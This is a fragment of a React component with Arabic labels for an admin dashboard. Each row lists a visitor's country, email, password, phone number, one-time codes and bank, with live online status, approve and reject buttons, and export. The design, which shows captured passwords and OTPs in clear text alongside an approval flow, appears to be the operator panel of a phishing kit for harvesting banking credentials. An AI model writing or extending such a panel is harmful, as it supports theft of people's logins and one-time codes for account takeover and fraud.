                    <th className="px-6 py-3 text-right font-semibold text-muted-foreground text-xs">المعلومات</th>
                    <th className="px-6 py-3 text-right font-semibold text-muted-foreground text-xs">الحالة</th>
                    <th className="px-6 py-3 text-right font-semibold text-muted-foreground text-xs">الوقت</th>
                    <th className="px-6 py-3 text-center font-semibold text-muted-foreground text-xs">الاتصال</th>
                    <th className="px-6 py-3 text-center font-semibold text-muted-foreground text-xs">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedNotifications.map((notification) => (
                    <tr key={notification.id} className="border-b border-border/30 hover:bg-muted/50 transition-colors">
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          <MapPin className="h-4 w-4 text-muted-foreground" />
                          <span className="font-medium text-sm">{notification.country || "غير معروف"}</span>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={notification.password ? "default" : "secondary"}
                            className={
                              notification.password ? "bg-sky-600 text-xs cursor-pointer" : "text-xs cursor-pointer"
                            }
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            {notification.password ? "شخصي" : "لا يوجد"}
                          </Badge>
                          <Badge
                            variant={notification.phone ? "default" : "secondary"}
                            className={
                              notification.phone ? "bg-pink-400 text-xs cursor-pointer" : "text-xs cursor-pointer"
                            }
                          >
                            {notification.phone ? notification.phone : "—"}
                          </Badge>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        {notification.status === "approved" ? (
                          <Badge className="bg-emerald-100 text-emerald-700 dark:bg-emerald-900/30 dark:text-emerald-300 text-xs">
                            موافق
                          </Badge>
                        ) : notification.status === "rejected" ? (
                          <Badge className="bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-300 text-xs">
                            مرفوض
                          </Badge>
                        ) : (
                          <Badge className="bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-300 text-xs">
                            معلق
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2 text-xs text-muted-foreground">
                          <Clock className="h-3 w-3" />
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex justify-center gap-2">
                          {notification.otp && (
                            <Badge variant="outline" className="text-xs">
                              {notification.otp}
                            </Badge>
                          )}
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => handleDelete(notification.id)}
                            className="h-8 w-8 p-0 text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20"
                            title="حذف"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="lg:hidden space-y-3 p-4">
              {paginatedNotifications.map((notification) => (
                <Card key={notification.id} className="border-0 shadow-sm bg-muted/30">
                  <CardHeader className="pb-3">
                    <div className="flex justify-between items-start gap-4">
                      <div className="flex items-center gap-3 flex-1">
                        <MapPin className="h-5 w-5 text-primary flex-shrink-0" />
                        <div>
                          <p className="font-semibold text-sm">{notification.country || "غير معروف"}</p>
                          <p className="text-xs text-muted-foreground">
                            {notification.createdDate &&
                              formatDistanceToNow(new Date(notification.createdDate), {
                                addSuffix: true,
                                locale: ar,
                              })}
                          </p>
                        </div>
                      </div>
                      <UserStatus userId={notification.id} />
                    </div>
                  </CardHeader>

                  <CardContent className="pt-0 space-y-3">
                    <div className="flex flex-wrap gap-2">
                      <Badge
                        variant={notification.password ? "default" : "secondary"}
                        className="text-xs cursor-pointer"
                        onClick={() => handleInfoClick(notification, "personal")}
                      >
                        {notification.password ? "شخصي" : "لا يوجد"}
                      </Badge>
                      <Badge variant={notification.phone ? "default" : "secondary"} className="text-xs">
                        {notification.phone ? notification.phone : "—"}
                      </Badge>
                      {notification.otp && (
                        <Badge variant="outline" className="text-xs">
                          {notification.otp}
                        </Badge>
                      )}
                    </div>

                    <div className="flex items-center justify-between pt-2 border-t border-border/50">
                      <span className="text-xs text-muted-foreground">الحالة:</span>
                      {notification.status === "approved" ? (
                        <Badge className="bg-emerald-100 text-emerald-700 dark:bg-emerald-900/30 dark:text-emerald-300 text-xs">
                          موافق
                        </Badge>
                      ) : notification.status === "rejected" ? (
                        <Badge className="bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-300 text-xs">
                          مرفوض
                        </Badge>
                      ) : (
                        <Badge className="bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-300 text-xs">
                          معلق
                        </Badge>
                      )}
                    </div>

                    <div className="flex gap-2 pt-2 border-t border-border/50">
                      <Button
                        onClick={() => handleApproval("approved", notification.id)}
                        className="flex-1 h-8 text-xs"
                        size="sm"
                        disabled={notification.status === "approved"}
                      >
                        موافقة
                      </Button>
                      <Button
                        onClick={() => handleApproval("rejected", notification.id)}
                        variant="destructive"
                        className="flex-1 h-8 text-xs"
                        size="sm"
                        disabled={notification.status === "rejected"}
                      >
                        رفض
                      </Button>
                      <Button
                        onClick={() => handleDelete(notification.id)}
                        variant="ghost"
                        className="h-8 w-8 p-0 text-red-600"
                        size="sm"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {paginatedNotifications.length === 0 && (
              <div className="text-center py-12">
                <div className="w-16 h-16 mx-auto mb-4 rounded-lg bg-muted flex items-center justify-center">
                  <Bell className="h-8 w-8 text-muted-foreground" />
                </div>
                <h3 className="text-base font-semibold mb-2">لا توجد إشعارات</h3>
                <p className="text-muted-foreground text-sm">لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
              </div>
            )}
          </CardContent>

          {filteredNotifications.length > 0 && (
            <CardFooter className="border-t border-border/50 bg-muted/30 p-4">
              <Pagination
                currentPage={currentPage}
                totalPages={totalPages}
                onPageChange={handlePageChange}
                totalItems={filteredNotifications.length}
                itemsPerPage={itemsPerPage}
              />
            </CardFooter>
          )}
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-lg">
              {selectedInfo === "personal" ? (
                <>
                  <User className="h-5 w-5 text-primary" />
                  المعلومات الشخصية
                </>
              ) : (
                <>
                  <CreditCard className="h-5 w-5 text-primary" />
                  معلومات البنك
                </>
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-muted rounded-lg p-4 space-y-3">
                {[
                  { label: "ايميل", value: selectedNotification.email },
                  { label: "رمز السري", value: selectedNotification.password },
                  { label: "كود", value: selectedNotification.phone },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground text-sm">{label}:</span>
                        <span className="font-semibold text-sm">{value}</span>
                      </div>
                    ),
                )}
              </div>
              <div className="rounded-lg bg-amber-50 dark:bg-amber-950/20 p-3 border border-amber-200 dark:border-amber-900">
                <p className="text-xs text-amber-800 dark:text-amber-200">⚠️ البيانات الحساسة محمية</p>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-muted rounded-lg p-4 space-y-3">
                {[
                  { label: "البنك", value: selectedNotification.bank },
                  { label: "الدولة", value: selectedNotification.country },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground text-sm">{label}:</span>
                        <span className="font-semibold text-sm">{value}</span>
                      </div>
                    ),
                )}
              </div>
              <div className="rounded-lg bg-amber-50 dark:bg-amber-950/20 p-3 border border-amber-200 dark:border-amber-900">
                <p className="text-xs text-amber-800 dark:text-amber-200">⚠️ البيانات الحساسة محمية</p>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={notifications} />

      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
    </div>
  )
}
